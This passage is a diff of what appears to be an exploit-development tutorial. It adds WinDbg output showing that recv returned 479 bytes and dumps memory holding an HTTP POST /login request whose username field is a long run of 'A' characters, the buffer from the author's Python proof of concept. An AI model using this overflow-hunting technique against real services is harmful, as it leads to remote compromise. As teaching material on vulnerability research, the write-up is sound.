@@ -138,6 +138,38 @@ I can see that the `eax` register contains `0x000001df`, this is the return valu
 Evaluate expression: 479 = 000001df
 ```
 
-This evaluates to `479` in decimal, which just happens to be the length of the buffer we sent in our `Python` PoC. The Microsoft documentation states:
+This evaluates to `479` in decimal, which just happens to be the length of the buffer we sent in our `Python` PoC. The Microsoft documentation states: *"If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received."* It looked like my buffer was saved to the memory location successfully. I confirmed that:
 
-[comment]:If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received.
+```
+0:009> dc 0x0180d744 L78
+0180d744  54534f50 6f6c2f20 206e6967 50545448  POST /login HTTP
+0180d754  312e312f 6f480a0d 203a7473 2e323931  /1.1..Host: 192.
+0180d764  2e383631 39312e31 550a0d30 2d726573  168.1.190..User-
+0180d774  6e656741 4d203a74 6c697a6f 352f616c  Agent: Mozilla/5
+0180d784  2820302e 3b313158 6e694c20 69207875  .0 (X11; Linux i
+0180d794  3b363836 3a767220 302e3534 65472029  686; rv:45.0) Ge
+0180d7a4  2f6f6b63 30313032 31303130 72694620  cko/20100101 Fir
+0180d7b4  786f6665 2e35342f 410a0d30 70656363  efox/45.0..Accep
+0180d7c4  74203a74 2f747865 6c6d7468 7070612c  t: text/html,app
+0180d7d4  6163696c 6e6f6974 7468782f 782b6c6d  lication/xhtml+x
+0180d7e4  612c6c6d 696c7070 69746163 782f6e6f  ml,application/x
+0180d7f4  713b6c6d 392e303d 2a2f2a2c 303d713b  ml;q=0.9,*/*;q=0
+0180d804  0a0d382e 65636341 4c2d7470 75676e61  .8..Accept-Langu
+0180d814  3a656761 2d6e6520 652c5355 3d713b6e  age: en-US,en;q=
+0180d824  0d352e30 6665520a 72657265 7468203a  0.5..Referer: ht
+0180d834  2f3a7074 3239312f 3836312e 3131322e  tp://192.168.211
+0180d844  3934312e 676f6c2f 0a0d6e69 6e6e6f43  .149/login..Conn
+0180d854  69746365 203a6e6f 736f6c63 430a0d65  ection: close..C
+0180d864  65746e6f 542d746e 3a657079 70706120  ontent-Type: app
+0180d874  6163696c 6e6f6974 772d782f 662d7777  lication/x-www-f
+0180d884  2d6d726f 656c7275 646f636e 0a0d6465  orm-urlencoded..
+0180d894  746e6f43 2d746e65 676e654c 203a6874  Content-Length: 
+0180d8a4  0d303231 750a0d0a 6e726573 3d656d61  120....username=
+0180d8b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d8c4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d8d4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d8e4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d8f4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d904  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0180d914  41414141 73617026 726f7773 00413d64  AAAA&password=A.
+```
